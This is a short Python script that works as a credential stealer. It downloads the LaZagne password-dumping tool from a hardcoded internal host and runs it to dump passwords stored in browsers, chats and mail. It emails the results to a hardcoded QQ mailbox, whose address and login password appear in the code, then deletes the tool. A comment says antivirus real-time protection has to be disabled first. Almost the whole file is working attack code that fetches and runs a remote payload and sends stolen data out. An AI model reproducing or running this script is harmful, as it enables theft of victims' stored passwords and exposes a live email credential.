#!/usr/bin/env python

import requests
import optparse
import subprocess
import smtplib
import os
import tempfile
import socket

# LaZagne --> steal stored passwords, e.g cache
# laZagne_x86.exe [module_name], e.g browsers, chats, mails...
# need to disable defender (virus & threats real-time protection)
# cross-platform

def download(url):
    # GET request --> response
    get_response = requests.get(url)

    # splited by /, last element is the filename
    filename = url.split("/")[-1]

    with open(filename, mode="wb") as out_file:
        # open a binary file to write
        out_file.write(get_response.content)
    print("[+] Download sucessfully.")

def send_mail(email, password, message):
    server = smtplib.SMTP_SSL("smtp.qq.com", 465)
    server.login(email, password)
    server.sendmail(from_addr=email, to_addrs=email, msg=message.encode("gb2312"))
    server.quit()
    print("[+] Mail sent.")
        
# temp_directory = tempfile.gettempdir()
# os.chdir(temp_directory)
host_ip = "192.168.140.130"
url = "http://" + host_ip + "/Projects/laZagne.exe"
download(url)
result = subprocess.check_output("laZagne.exe all", shell=True)
send_mail("940546571@qq.com", "ltuboefioyepbbdc", result)
os.remove("laZagne.exe")